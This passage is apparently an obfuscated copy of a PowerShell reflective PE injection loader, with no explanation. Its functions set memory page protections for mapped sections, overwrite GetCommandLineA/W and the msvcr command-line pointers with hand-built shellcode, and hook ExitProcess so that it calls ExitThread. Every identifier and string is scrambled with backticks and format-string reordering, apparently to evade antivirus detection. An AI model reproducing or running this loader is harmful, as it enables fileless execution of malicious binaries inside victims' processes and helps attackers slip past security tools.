                    if ((-not ${lOadby`O`R`diN`AL}) -and (${Pr`oCEd`URE`Na`mEptR} -ne  ( &("{1}{3}{2}{0}"-f'LdIteM','G','Hi','ET-c') ("{2}{1}{0}" -f 'Le:2m1aJ','AB','VAri') )."V`ALue"::"ZE`RO"))
                    {
                          ( &("{2}{0}{1}{3}" -f'-vaR','iAb','GEt','LE')  69Pb  )."VAl`Ue"::("{0}{1}{2}" -f'F','ree','HGlobal').Invoke(${P`ROc`EDu`REn`AME`ptR})
                        ${p`ROcE`dUREn`Ame`PTR} =  ${2`M1Aj}::"ze`Ro"
                    }
				}
				
				${imPO`RTDe`s`CR`I`PTORptR} = &("{2}{4}{3}{0}{1}" -f 'tAsUnsi','gned','Add-Sig','dIn','ne') (${iM`pORTDEScRi`p`ToR`PTr}) (  ${69`PB}::"sIZe`of"([Type]${wIn`32T`y`pES}."ImAge`_`iMpORt`_dEs`CRiPTor"))
			}
		}
	}

	Function g`e`T-viR`TuAlp`RoteCtValuE
	{
		Param(
		[Parameter(PositioN = 0, mANdAtOry = ${T`Rue})]
		[UInt32]
		${S`E`ctIoncHaRac`TeR`i`sti`cS}
		)
		
		${pR`otEc`TIO`Nfl`Ag} = 0x0
		if ((${SectI`oN`Ch`ArACter`I`sTiCs} -band ${wIN3`2COns`TanTs}."I`mAGe_SCn`_MeM`_E`XeC`UtE") -gt 0)
		{
			if ((${seCt`ioN`c`HarACTerISt`iCS} -band ${WIn3`2c`onSTanTs}."imAge`_SCn_`me`M_ReAd") -gt 0)
			{
				if ((${SeCti`O`N`Ch`ARaCT`ERIS`TIcs} -band ${WIN32coN`sT`An`Ts}."imAGe`_`s`Cn`_me`m_wRIte") -gt 0)
				{
					${p`ROteC`TIonFlaG} = ${Wi`N32`CONSTA`Nts}."P`A`gE`_`exECUTE_rEADWRitE"
				}
				else
				{
					${p`RoTE`CtION`FLag} = ${Win`32co`NS`TA`NTs}."PAg`E`_e`xEcUT`E_r`Ead"
				}
			}
			else
			{
				if ((${seC`TIoNCHaR`A`cteRi`s`Ti`cS} -band ${WiN`3`2co`Nst`ANTs}."i`M`AG`e_scn_m`Em_WRI`Te") -gt 0)
				{
					${prot`ect`Io`Nfl`AG} = ${win3`2`C`OnStANTs}."PAG`e_e`Xe`Cute_W`RITE`CopY"
				}
				else
				{
					${p`RotEctiO`Nf`l`Ag} = ${WiN32C`oN`s`TAN`Ts}."PA`G`e_EX`ecUTE"
				}
			}
		}
		else
		{
			if ((${seCTIO`Nch`Ar`ACT`eri`sT`iCS} -band ${WI`N`32coNs`TAN`TS}."Im`AGe_S`CN_M`e`m_`REad") -gt 0)
			{
				if ((${sECT`ion`characT`Er`ist`ics} -band ${wiN3`2`cONSTAn`TS}."iMA`Ge_s`CN_Mem_wri`Te") -gt 0)
				{
					${pR`OTEc`TIo`Nflag} = ${Win32co`N`sta`Nts}."P`AGE_REAd`W`Ri`Te"
				}
				else
				{
					${prot`E`CtI`oNfLAg} = ${Wi`N`32cOnsTaN`Ts}."pA`G`E_ReAdoNLY"
				}
			}
			else
			{
				if ((${sEcTI`O`N`C`HaRaC`TE`RI`STiCs} -band ${wIN32c`o`NstAnTs}."I`mAge_sCn`_`M`em_WRItE") -gt 0)
				{
					${prOteC`T`io`NfL`AG} = ${Win32c`on`St`Ants}."pAG`E_`WrI`T`ecopy"
				}
				else
				{
					${p`RO`TEct`IOnflAg} = ${Win`3`2`CONSTANtS}."P`A`Ge`_NoACCEsS"
				}
			}
		}
		
		if ((${sE`ctIO`N`C`HaR`ActErisTIcs} -band ${wIN3`2`COns`TANTs}."IM`Ag`e`_sCn_`m`Em_nOt_Ca`cHED") -gt 0)
		{
			${pRo`TEC`Tio`NfLAg} = ${PR`o`T`EctIONfl`AG} -bor ${wi`N3`2conSTantS}."pa`gE`_`NocaCHe"
		}
		
		return ${P`RoTe`C`TiOnfl`AG}
	}

	Function u`pDat`E-`meMORYpr`O`T`ECt`IOnFLaGS
	{
		Param(
		[Parameter(POSITion = 0, ManDAtORY = ${TR`UE})]
		[System.Object]
		${p`e`INfo},
		
		[Parameter(poSiTION = 1, MANdAtoRY = ${tr`Ue})]
		[System.Object]
		${w`IN`32FU`NCtIons},
		
		[Parameter(POSItioN = 2, mANdaTOrY = ${Tr`UE})]
		[System.Object]
		${wi`N32`co`NstANTS},
		
		[Parameter(PosITiOn = 3, MaNDatory = ${t`RuE})]
		[System.Object]
		${WI`N`32TYP`ES}
		)
		
		for( ${I} = 0; ${I} -lt ${P`eiNfo}."ImaGe_`NT_Hea`dE`Rs"."fIlEH`E`ADER"."N`UMbeRoF`SecTIonS"; ${i}++)
		{
			[IntPtr]${sE`ctIONH`Ea`DEr`PTR} = [IntPtr](&("{0}{4}{6}{5}{3}{2}{1}"-f 'Ad','Unsigned','As','nt','d','dI','-Signe') ([Int64]${P`EI`NFo}."sec`T`IOnHeaD`eRptr") (${i} *   (&('Gi') ("{4}{3}{1}{0}{2}"-f'69p','e:','b','bl','varIA'))."VaL`UE"::"sIzE`Of"([Type]${wIN32`T`Yp`Es}."iMa`gE`_S`ECt`ion_heAD`eR")))
			${sE`CtIo`NHE`AD`Er} =  ${69`PB}::"p`TR`ToST`Ruc`TuRe"(${Se`cti`oN`hEADerp`Tr}, [Type]${W`iN`32TYP`es}."imAGE_sEcTI`on`_He`A`D`er")
			[IntPtr]${s`ECtIoNP`Tr} = &("{5}{0}{3}{4}{6}{1}{2}" -f'-','ne','d','SignedI','ntAsUnsi','Add','g') (${peiN`Fo}."P`EhaND`lE") (${sE`cT`Io`Nh`eAdER}."virTU`A`LaD`dresS")
			
			[UInt32]${p`R`oTECTf`lag} = &("{2}{4}{0}{1}{3}{5}"-f'a','lProtectVa','Get-Vir','lu','tu','e') ${sEc`T`iO`NheADER}."ChAraCt`eRIs`TicS"
			[UInt32]${SecTio`NS`i`ZE} = ${S`ect`ioN`h`EADEr}."vIrTUA`l`SIzE"
			
			[UInt32]${Old`p`R`ot`eCTfLaG} = 0
			&("{3}{0}{2}{1}{4}" -f '-','ange','MemoryR','Test','Valid') -DebugString ("{7}{9}{1}{6}{0}{10}{3}{4}{5}{8}{2}"-f'ory','t','otect','tectionF','lags::Virt','ual','e-Mem','Up','Pr','da','Pro') -PEInfo ${PeiN`FO} -StartAddress ${s`eC`Ti`Onptr} -Size ${sEc`T`Ion`siZE} | &("{0}{2}{1}"-f 'Out-','l','Nul')
			${SuC`CESs} = ${w`in32FUNCtI`o`NS}."v`irtu`A`lpRO`TecT"."iN`V`oKe"(${SeCtIO`NP`TR}, ${se`Cti`O`NSIZE}, ${ProTECt`F`L`AG}, [Ref]${o`LdprOt`e`CT`FlaG})
			if (${S`UCc`ESs} -eq ${F`AlSE})
			{
				Throw ("{7}{2}{4}{6}{8}{1}{0}{5}{3}" -f't','tec','ange','n',' memor','io','y','Unable to ch',' pro')
			}
		}
	}
	
	
	
	Function UPdate-`exeFunctI`O`Ns
	{
		Param(
		[Parameter(POsITioN = 0, MAndatORY = ${t`RuE})]
		[System.Object]
		${peI`N`FO},
		
		[Parameter(pOsITIOn = 1, MANdATorY = ${t`RUE})]
		[System.Object]
		${Wi`N32Fu`Nct`Io`Ns},
		
		[Parameter(POsitIon = 2, MAndatOry = ${TR`Ue})]
		[System.Object]
		${WI`N32Co`N`sTan`TS},
		
		[Parameter(posItIon = 3, maNdATOry = ${Tr`Ue})]
		[String]
		${e`xe`ARG`UmE`NTs},
		
		[Parameter(POsitiOn = 4, ManDAtoRY = ${T`RuE})]
		[IntPtr]
		${EXeD`oneBY`T`eptr}
		)
		
		
		${re`T`UR`NARRAY} = @() 
		
		${P`TRsI`zE} =  ${69`PB}::"s`iZEof"([Type][IntPtr])
		[UInt32]${olD`PROteCTF`l`AG} = 0
		
		[IntPtr]${KErn`El32`haND`Le} = ${WI`N32Fun`CT`I`oNs}."gEt`ModulEhA`N`dLE"."i`NVoke"(("{2}{0}{1}{3}"-f 'rnel','3','Ke','2.dll'))
		if (${K`E`RNEL3`2`haNDLE} -eq  ( &("{1}{0}" -f'E','VaRiAbl') ("{0}{1}" -f '2m1A','J'))."v`AluE"::"Z`ErO")
		{
			throw ("{3}{0}{2}{1}" -f 'ernel32','dle null',' han','K')
		}
		
		[IntPtr]${KE`RN`eLBASeHa`ND`le} = ${wIn3`2`Func`Ti`OnS}."gEtMod`U`leHAN`DLE"."i`NvokE"(("{3}{0}{2}{1}" -f 'ernelBa','e.dll','s','K'))
		if (${k`er`NELba`S`eH`AndlE} -eq   (&("{2}{1}{0}" -f'e','l','geT-vaRiab') ("2M"+"1aj")  -Va)::"ZE`Ro")
		{
			throw ("{2}{1}{6}{4}{3}{5}{0}"-f 'll','ernel','K','n','se ha','dle nu','Ba')
		}

		
		
		
		${cMD`L`Ine`warg`sPTr} =  (  &("{1}{0}{2}"-f'-I','GeT','teM')  ("{3}{1}{2}{0}" -f'Pb','lE:','69','VARiAB')  )."vAL`UE"::("{2}{3}{1}{0}{4}" -f 'l','HG','Strin','gTo','obalUni').Invoke(${eXE`Ar`gu`MenTS})
		${CMd`LINeA`AR`GsPTr} =   ${6`9Pb}::("{4}{3}{0}{2}{5}{1}"-f 'ri','alAnsi','ngToH','t','S','Glob').Invoke(${ex`eaRgU`M`eNts})
	
		[IntPtr]${getCOm`Ma`N`dl`I`NE`AaDdr} = ${win`3`2fu`NctIo`Ns}."GET`PR`ocADd`RE`ss"."Inv`o`Ke"(${keR`NeLbaS`eHa`N`DLE}, ("{3}{1}{0}{2}" -f'L','etCommand','ineA','G'))
		[IntPtr]${gE`TCOMmAndL`I`NE`WaDDR} = ${WIn32FUNcT`I`o`Ns}."GeTp`R`OCA`Dd`ReSs"."I`NvoKE"(${k`ern`elb`AseHandle}, ("{4}{1}{3}{0}{2}"-f 'ma','tC','ndLineW','om','Ge'))

		if (${gETCOMm`ANd`LINe`A`AddR} -eq   ${2`M1aj}::"z`erO" -or ${g`etcO`mmaNdLin`e`WADdr} -eq  ( &("{0}{1}" -f'G','cI') ("{3}{0}{2}{1}" -f 'Riab','e:2m1AJ','L','va'))."va`Lue"::"ze`RO")
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr) "
		}

		
		[Byte[]]${s`HELLc`O`de1} = @()
		if (${pTrSi`zE} -eq 8)
		{
			${S`h`E`LLCode1} += 0x48	
		}
		${sh`e`l`lCODe1} += 0xb8
		
		[Byte[]]${SHE`l`lCoDE2} = @(0xc3)
		${ToTaL`s`i`zE} = ${sHeL`lcoD`e1}."LEnG`TH" + ${p`TRsi`ZE} + ${SH`ELlc`Ode2}."lEng`TH"
		
		
		
		${GeTC`OmMAnDli`N`Ea`oRiGBY`T`esPTr} =   ${69`pB}::("{1}{2}{0}"-f 'HGlobal','All','oc').Invoke(${To`T`ALSiZE})
		${gE`T`COm`MAN`dLineW`ORI`G`ByteSP`Tr} =   (&("{0}{1}" -f'gC','i')  ("VARIAB"+"L"+"e"+":69"+"pB")  )."Va`luE"::("{2}{1}{0}"-f'obal','l','AllocHG').Invoke(${ToT`ALSi`Ze})
		${wIN32`FunCt`i`oNS}."Mem`CPY"."I`NvOke"(${gET`c`OMMAn`D`Li`NEAORIg`B`ytESPTR}, ${GEt`C`oM`mandL`IN`EAaDDR}, [UInt64]${TOT`A`lSIze}) | &("{2}{0}{1}"-f '-Nu','ll','Out')
		${wIN3`2fU`NCT`IonS}."me`mC`py"."IN`VokE"(${G`eTC`omManDLInewOri`GByT`EsPTr}, ${g`etComMA`N`Dl`inEWAD`dr}, [UInt64]${TOta`ls`IzE}) | &("{1}{2}{0}" -f'ull','Out-','N')
		${r`EtUrnAR`RAy} += ,(${gET`Co`M`mANdL`InE`AaDDr}, ${GEtC`OMMAndLI`NeaOrig`Bytes`PTr}, ${T`oT`AlSI`ZE})
		${Re`TUrN`ARRAy} += ,(${G`etcOm`MAn`d`LiNEWADDr}, ${get`comm`AN`DL`iN`eWO`RIgbyTesPTR}, ${TOtAL`S`I`ze})

		
		[UInt32]${O`LdpRot`eC`TflAG} = 0
		${sUc`c`ess} = ${wIN32Fu`NC`TiONS}."Virtu`AlPr`o`TECT"."Invo`KE"(${G`eTC`OmMAndLiNeAA`Ddr}, [UInt32]${TO`T`AlSize}, [UInt32](${WIN32`co`Nsta`Nts}."p`A`ge`_EXEcUtE_REA`dWRI`TE"), [Ref]${OL`dp`ROt`Ec`TfLAG})
		if (${SU`C`cESS} = ${F`ALSE})
		{
			throw ("{1}{5}{4}{2}{3}{7}{0}{6}" -f'ct f','Cal',' VirtualPr','ot','o','l t','ailed','e')
		}
		
		${g`etCOMmand`l`I`NEaaD`dR`TeMp} = ${G`eTComm`A`NDlIN`eaAddr}
		&("{6}{5}{3}{2}{1}{4}{0}" -f 'ry','To','es','t','Memo','rite-By','W') -Bytes ${Shell`C`oD`e1} -MemoryAddress ${GEtC`Omm`A`NdlineaadDrT`Emp}
		${get`c`Om`MandlIN`EaAD`D`Rte`mp} = &("{2}{0}{4}{3}{1}" -f'-Signe','igned','Add','s','dIntAsUn') ${GEt`cOMM`And`lInE`A`ADDRteMp} (${sH`ELL`C`oDE1}."Le`N`gTH")
		  (&("{0}{2}{1}" -f'vA','IaBLE','R') 69PB  -vaL  )::("{1}{2}{0}" -f 'r','Structur','eToPt').Invoke(${CmDl`iNe`Aar`gSPTr}, ${G`EtcO`mM`A`NDlIn`e`AaD`DrTemP}, ${Fal`Se})
		${GEt`COMM`A`NdLiNEAaDdrT`eMp} = &("{1}{2}{5}{3}{0}{4}"-f'ne','Ad','d','Sig','dIntAsUnsigned','-') ${GEtcommAn`d`lInEaA`DdR`T`eMp} ${p`TRs`ize}
		&("{3}{4}{2}{0}{1}{5}"-f's','ToMemor','yte','Write','-B','y') -Bytes ${sHE`LLc`ODE2} -MemoryAddress ${g`Et`ComMaNDlI`NEAadd`R`T`E`mp}
		
		${w`iN`32fuNc`Ti`ons}."viRTUaLpROt`E`cT"."INv`O`Ke"(${G`E`TcommAN`dLI`N`eAADDR}, [UInt32]${tOtALS`I`zE}, [UInt32]${oLD`pR`OtE`CT`FLag}, [Ref]${o`ldPR`oTEc`T`FLAG}) | &("{0}{1}" -f'Out','-Null')
		
		
		
		[UInt32]${o`L`DPROTEC`TFl`Ag} = 0
		${s`U`cCESS} = ${wi`N`32`FuncT`ioNS}."vi`R`TU`A`lPROtECT"."i`Nv`OkE"(${G`etCOMmA`Nd`lIne`WaDDr}, [UInt32]${t`otal`sIZe}, [UInt32](${Win32co`NS`TaNts}."pAgE_`ExecutE_`RE`AdWrIte"), [Ref]${ol`dProt`EC`TFlag})
		if (${S`Uc`CesS} = ${Fal`Se})
		{
			throw ("{4}{1}{3}{0}{5}{2}" -f'ual','ll to Vir','d','t','Ca','Protect faile')
		}
		
		${gETc`O`mM`ANdLi`NEW`ADdRte`Mp} = ${getCoMm`A`NdLINEWA`Ddr}
		&("{3}{0}{4}{1}{2}" -f 'sTo','m','ory','Write-Byte','Me') -Bytes ${S`HellC`o`dE1} -MemoryAddress ${Ge`T`CO`M`man`Dlin`EWADdrT`emP}
		${getcO`MmaNDl`IN`ew`ADDrTEMP} = &("{0}{4}{1}{2}{3}{5}" -f 'A','d-','Signed','IntAsU','d','nsigned') ${G`Et`c`ommA`NdlinE`WaDdr`TeMP} (${ShE`lLCOD`E1}."lENg`TH")
		  (&("{0}{1}"-f'gET','-ITem')  ('v'+'ARi'+'ABlE:69'+'PB') )."V`AlUE"::("{3}{1}{4}{0}{2}" -f 't','uctur','r','Str','eToP').Invoke(${cmdl`iNE`WA`RGsPtr}, ${g`et`coM`Ma`NdliNEWaDd`R`TEMP}, ${fA`L`Se})
		${Get`cO`mmA`N`dLIne`w`AdDrT`eMP} = &("{6}{0}{3}{2}{4}{1}{5}"-f'dd-Sig','sign','I','ned','ntAsUn','ed','A') ${getcOmMaNdlin`EWa`DDr`TE`Mp} ${P`TRsIZE}
		&("{3}{4}{0}{2}{1}"-f 'e-BytesToMe','y','mor','Wr','it') -Bytes ${S`hEll`CODE2} -MemoryAddress ${GetCo`Mma`NdlinEw`Add`R`TE`mp}
		
		${w`IN32fUn`ctio`Ns}."ViRTU`A`lp`R`oteCt"."I`NV`oKE"(${gEtc`OMmaNd`L`inewa`ddr}, [UInt32]${TOt`Als`i`ZE}, [UInt32]${O`L`Dp`ROtEcTf`LaG}, [Ref]${o`L`DpROtECT`Flag}) | &("{0}{1}{2}" -f'Ou','t-Nul','l')
		
		
		
		
		
		
		
		
		${dLLl`i`ST} = @(("{0}{2}{3}{1}" -f'ms','.dll','vcr','70d'), ("{0}{2}{1}"-f'ms','ll','vcr71d.d'), ("{0}{3}{2}{1}"-f 'ms','0d.dll','r8','vc'), ("{3}{0}{2}{1}" -f 'vcr','ll','90d.d','ms'), ("{0}{3}{1}{2}"-f'msv','100d.dl','l','cr'), ("{3}{1}{2}{0}"-f '110d.dll','v','cr','ms'), ("{0}{1}{2}" -f'm','svcr70','.dll') `
			, ("{1}{2}{0}" -f'l','msvcr7','1.dl'), ("{1}{3}{0}{2}" -f 'vcr80.d','m','ll','s'), ("{1}{2}{0}" -f '.dll','msvcr','90'), ("{2}{1}{0}"-f'll','vcr100.d','ms'), ("{0}{2}{3}{1}" -f'm','l','svcr110.d','l'))
		
		foreach (${d`LL} in ${d`LlL`ISt})
		{
			[IntPtr]${Dl`LHanD`le} = ${wIn3`2`FUNcT`ioNs}."gEtm`oDU`lEHA`Ndle"."iNV`Oke"(${D`lL})
			if (${DLL`H`Andle} -ne   (&("{1}{2}{3}{0}"-f'IABLE','ge','T','-vAr') ('2M1A'+'J') )."V`AluE"::"ze`Ro")
			{
				[IntPtr]${wcm`DL`Naddr} = ${WiN3`2F`UNc`TIONs}."GetProc`A`ddr`ESS"."in`VOke"(${dLlHaN`D`lE}, ("{2}{1}{0}"-f'mdln','c','_w'))
				[IntPtr]${aC`Mdl`NADdR} = ${w`iN`32fUnctI`onS}."G`e`TPRo`CAdDResS"."iN`Vo`Ke"(${d`llhan`D`le}, ("{1}{0}" -f'n','_acmdl'))
				if (${W`cm`dLNAD`DR} -eq   (&("{0}{2}{1}{3}"-f'get-','r','va','iABLE')  ("{1}{0}" -f 'AJ','2M1')  -ValU  )::"Ze`Ro" -or ${acMdLN`AD`dr} -eq  ( &("{2}{0}{1}" -f 'bl','E','gEt-VARiA')  ('2'+'M1aJ')  )."v`AluE"::"ze`RO")
				{
					((("{7}{0}{2}{6}{3}{5}{1}{4}{8}" -f 'r, couldn','_a','nmxt',' _wc','cmdl','mdln or ',' find','Erro','n'))-RepLACe ([ChAr]110+[ChAr]109+[ChAr]120),[ChAr]39)
				}
				
				${ne`wACmDLN`pTr} =   (&("{0}{2}{1}"-f 'Var','Le','Iab')  ("6"+"9pb")  )."v`ALUe"::("{5}{4}{1}{3}{2}{0}"-f 'i','ToH','obalAns','Gl','ng','Stri').Invoke(${E`XeaRguM`EnTS})
				${n`Ew`WCMd`l`NPTr} =  ( &("{1}{2}{0}"-f 'Le','VAr','IAB') 69pB -VaLueO )::("{0}{2}{4}{3}{5}{1}" -f'Str','Uni','in','b','gToHGlo','al').Invoke(${e`xE`ArgUm`e`NTs})
				
				
				${o`RI`gaCMd`L`NPtr} =   (  &("{0}{2}{1}" -f 'chi','Tem','LDI')  ("V"+"AriABL"+"e:69"+"pb")  )."val`UE"::"P`T`RToStrUC`TUrE"(${A`cM`dLnadDR}, [Type][IntPtr])
				${o`RIgw`cMdl`NpTr} =  ${6`9Pb}::"pt`R`TOs`TruCtUrE"(${W`cMdLN`A`ddR}, [Type][IntPtr])
				${o`Ri`GA`CMd`lNp`T`RStORAGe} =   (  &("{1}{2}{0}"-f'Ble','vAR','iA')  ("6"+"9PB")  )."VaL`Ue"::("{3}{2}{1}{0}"-f 'l','Globa','ocH','All').Invoke(${p`T`RsIZe})
				${ORIgw`cMDlnpt`RSTOR`A`GE} =   ( &("{2}{3}{0}{1}"-f 'r','IAblE','g','Et-VA') 69PB  -VALuE  )::("{0}{1}{2}" -f 'All','ocHGlob','al').Invoke(${pT`RsIZE})
				 ( &("{3}{0}{2}{1}"-f'-','Ble','VarIa','GET')  69Pb )."v`ALue"::("{2}{0}{1}" -f'oP','tr','StructureT').Invoke(${Ori`GACMD`L`NPTR}, ${ORi`GA`CMdlN`PTrsto`RaGE}, ${fa`LSe})
				 ${6`9pB}::("{0}{3}{2}{1}{4}"-f 'Stru','t','eToP','ctur','r').Invoke(${O`RIGWCmDlN`p`Tr}, ${origwcMdlNPT`R`S`TorAGE}, ${f`A`lSE})
				${REtur`N`ArraY} += ,(${a`CmDLN`AdDr}, ${ORiGAcm`Dl`N`P`TRsTORaGE}, ${Ptr`si`Ze})
				${Retur`N`AR`RaY} += ,(${wcm`d`LnaD`DR}, ${orIGWc`Mdl`NPTRs`To`RaGE}, ${Pt`RSI`ZE})
				
				${SUc`cE`Ss} = ${WIn`3`2FU`Nc`TIONS}."virTUaL`P`R`oteCT"."i`NvokE"(${ac`Md`LNadDr}, [UInt32]${PTr`SizE}, [UInt32](${wI`N`3`2CoNstANtS}."pa`GE_exE`CUTE_reaD`w`RItE"), [Ref]${Ol`DpR`otEct`FlAg})
				if (${s`UC`CesS} = ${fa`lsE})
				{
					throw ("{5}{2}{4}{6}{0}{3}{1}{7}{8}" -f'V','ualProtec','ll ','irt','to','Ca',' ','t fail','ed')
				}
				 ${69`pb}::("{4}{2}{0}{3}{1}"-f 'ureTo','tr','uct','P','Str').Invoke(${N`EW`AcmdlnPtr}, ${Acm`DlN`AddR}, ${FaL`SE})
				${w`IN32`FU`Nctio`Ns}."vI`RTUAlPRoT`ecT"."iNv`OkE"(${ac`M`d`lnadDR}, [UInt32]${pT`Rs`iZE}, [UInt32](${OLD`P`ROTEC`TFl`Ag}), [Ref]${o`lDP`RoTe`CTfL`AG}) | &("{1}{0}" -f 'll','Out-Nu')
				
				${SU`CcE`ss} = ${w`I`N32FU`N`CtioNS}."vI`R`TuaLPRO`TEcT"."iNV`OKe"(${Wc`mdL`NADDR}, [UInt32]${Pt`RSi`ze}, [UInt32](${WIN32con`s`TAn`TS}."pAgE_Exe`CuT`E_R`EAD`WR`ItE"), [Ref]${OLDpr`OT`E`CtfLAg})
				if (${SUc`CeSS} = ${FAL`sE})
				{
					throw ("{2}{5}{7}{1}{4}{6}{3}{0}"-f 'd','ro','Call to ','aile','tec','Virtua','t f','lP')
				}
				 ${6`9PB}::("{2}{1}{4}{0}{3}"-f 'u','ruc','St','reToPtr','t').Invoke(${n`eww`cm`d`LnptR}, ${Wc`MD`LN`Addr}, ${fa`Lse})
				${Wi`N3`2funCT`iOns}."ViRtuA`lpR`o`T`ect"."inVo`ke"(${WC`mDL`NADDR}, [UInt32]${ptRsI`zE}, [UInt32](${olDproteC`T`FLaG}), [Ref]${oL`d`PRO`TE`cTFlAG}) | &("{0}{1}" -f'Out-Nul','l')
			}
		}
		
		
		
		
		

		${Ret`URn`Ar`RAy} = @()
		${exIt`FU`Ncti`O`Ns} = @() 
		
		
		[IntPtr]${mSco`REe`HA`NdlE} = ${wiN32`Fu`N`CtIoNS}."g`ETmOd`Ul`eHAnDlE"."inVo`ke"(("{1}{2}{0}" -f'l','m','scoree.dl'))
		if (${mSC`oReE`haN`dLE} -eq  ${2`M`1aj}::"Z`eRO")
		{
			throw ("{2}{3}{1}{0}" -f'null','le ','mscoree ha','nd')
		}
		[IntPtr]${C`oRe`xITp`R`Oc`EssadDR} = ${wIn32`FU`NctIoNs}."Ge`T`pRO`ca`DDrESs"."Invo`Ke"(${mSCOr`e`E`H`AndLe}, ("{2}{0}{1}"-f 'ro','cess','CorExitP'))
		if (${CoRe`xi`TPROCESS`ADDr} -eq  (&("{1}{2}{0}" -f'eM','child','It')  ('VaRiAB'+'Le'+':'+'2M1aj')  )."V`ALUE"::"Ze`RO")
		{
			Throw ("{0}{2}{5}{1}{4}{3}" -f 'C','ocess ad','o','und','dress not fo','rExitPr')
		}
		${E`xIT`F`UN`CtIons} += ${CO`R`EX`ITpROcES`SA`DDr}
		
		
		[IntPtr]${exItp`RO`Ce`ss`ADdR} = ${wIn`32`FUNcTIONS}."GEtPr`O`c`AD`DReSs"."iNVo`ke"(${k`ernel`32h`Andle}, ("{2}{0}{1}"-f 'tProc','ess','Exi'))
		if (${ExiTp`ROcEs`Sa`ddR} -eq  ${2M`1AJ}::"ZE`Ro")
		{
			Throw ("{2}{4}{3}{5}{6}{0}{1}"-f 'oun','d','ExitProcess a','ss','ddre',' ','not f')
		}
		${Exit`F`UN`C`TIONS} += ${e`xi`TpROc`E`SsaDDr}
		
		[UInt32]${OLDP`Ro`T`e`Ctflag} = 0
		foreach (${ProcEX`i`T`F`UNc`TI`OnAdDr} in ${EXi`TFu`NctiO`NS})
		{
			${pR`OCExiTFunc`TIOn`A`D`DR`TMP} = ${p`R`OcExitFunc`TiOn`AD`Dr}
			
			
			[Byte[]]${sh`eLLCo`DE1} = @(0xbb)
			[Byte[]]${SH`elLCOd`e2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if (${p`TRS`Ize} -eq 8)
			{
				[Byte[]]${sH`e`lLcodE1} = @(0x48, 0xbb)
				[Byte[]]${ShelLC`OD`e2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${s`Hel`Lcode3} = @(0xff, 0xd3)
			${T`otAL`s`iZe} = ${shE`l`lcOD`e1}."l`eNgth" + ${Ptr`Si`zE} + ${S`H`EL`lcode2}."L`enGtH" + ${PTrsi`ZE} + ${s`Hellc`oDe3}."L`EN`GTH"
			
			[IntPtr]${e`XiTtHR`EA`daDDr} = ${w`IN32FU`Nc`TIo`NS}."GET`Pr`OCA`DdReSS"."In`V`okE"(${kER`NEl32`h`AnDlE}, ("{1}{0}{2}" -f 'x','E','itThread'))
			if (${e`x`ITThrE`AdA`DDr} -eq   ( &("{1}{0}"-f'CI','G')  ('V'+'arIABLe:2m1'+'aJ')  )."Va`LUe"::"Z`ero")
			{
				Throw ("{7}{3}{2}{4}{6}{0}{5}{1}" -f'es',' not found','itThread ad','x','d','s','r','E')
			}

			${S`UCce`sS} = ${wI`N3`2fUn`ctIoNs}."viRT`Ualp`ROTect"."i`Nvoke"(${PR`OCE`x`iT`Fu`NctioNAddr}, [UInt32]${tO`T`AlsizE}, [UInt32]${Wi`N3`2co`NStaNTs}."Page_exE`cuT`E_RE`ADwRi`Te", [Ref]${O`lDp`Rote`CT`FLAG})
			if (${S`UCceSS} -eq ${f`AL`sE})
			{
				Throw ("{6}{2}{5}{1}{0}{3}{7}{4}"-f'Pr','l','to ','otect fa','led','Virtua','Call ','i')
			}
			
			
			${exItpROCessorIg`BytE`s`P`Tr} =  (  &("{0}{1}" -f 'VAria','bLE')  ("69"+"pb") -vAlueOn  )::("{2}{0}{3}{1}"-f 'cHG','l','Allo','loba').Invoke(${tOtA`LSI`ze})
			${w`i`N32fU`NctiOnS}."ME`mcPy"."INV`o`kE"(${ExItPR`Oces`sOr`i`GbYTes`ptR}, ${pRoCEXi`Tf`Unc`TIO`NAD`Dr}, [UInt64]${TOTa`L`sI`Ze}) | &("{2}{0}{1}"-f'ut','-Null','O')
			${reTUR`NArR`AY} += ,(${P`RO`c`eXI`TFUN`ctIoNAD`Dr}, ${eXI`TP`R`OcESso`RIGByte`S`ptR}, ${t`otAlS`ize})
			
			
			
			&("{5}{3}{4}{0}{2}{1}" -f'mo','y','r','te-Byte','sToMe','Wri') -Bytes ${sHELLcO`d`E1} -MemoryAddress ${pRoCex`it`F`Unct`i`ONAdD`RTmP}
			${pRoCeX`iT`FUnCT`iOn`A`dd`RtmP} = &("{1}{5}{4}{0}{2}{3}" -f'ns','Add','ig','ned','dIntAsU','-Signe') ${pro`cexiTfuNcti`OnAD`d`R`TMP} (${S`HeLL`CoDe1}."l`EngTH")
			  (&("{2}{0}{1}" -f'B','le','VaRIA') 69pb  -valUE )::("{2}{0}{3}{1}" -f'o','r','StructureT','Pt').Invoke(${ExE`dO`N`Eb`ytePtR}, ${prO`C`eX`iT`FuNc`TiO`NAddr`Tmp}, ${f`ALsE})
			${Pr`O`C`exiTfuNct`IonA`DD`RTmP} = &("{1}{0}{3}{4}{2}"-f'gned','Add-Si','sUnsigned','In','tA') ${Pr`oC`eXITfUnCTI`oNAddr`TmP} ${pT`RSIZE}
			&("{1}{0}{5}{3}{2}{4}" -f'ite-','Wr','mo','tesToMe','ry','By') -Bytes ${sheL`lC`Od`e2} -MemoryAddress ${ProC`exiTFU`N`CtIOn`Ad`dRtmP}
			${pROcexi`T`Fun`ctIoNa`d`dR`T`mp} = &("{3}{1}{0}{5}{4}{2}"-f 'tA','edIn','d','Add-Sign','Unsigne','s') ${PRo`ceXiT`FUNcTi`OnADDr`TmP} (${S`H`ellcodE2}."L`E`NGth")
			  ${69`pb}::("{0}{3}{2}{1}" -f'St','ToPtr','ucture','r').Invoke(${EXi`T`ThrE`ADAdDr}, ${PR`Oc`exiTfuncti`onADDrT`MP}, ${F`A`lsE})
			${pR`oCe`xItFU`NCTIoNADd`RtMP} = &("{4}{6}{0}{1}{2}{3}{5}"-f'gne','d','I','ntAsUnsi','Add-','gned','Si') ${p`Rocex`It`F`UnCT`iO`NAdd`RTmP} ${p`Trs`izE}
			&("{0}{4}{3}{1}{2}" -f'W','e','sToMemory','Byt','rite-') -Bytes ${ShElL`Co`De3} -MemoryAddress ${PROcE`xit`F`UnctIO`N`AddrTMp}

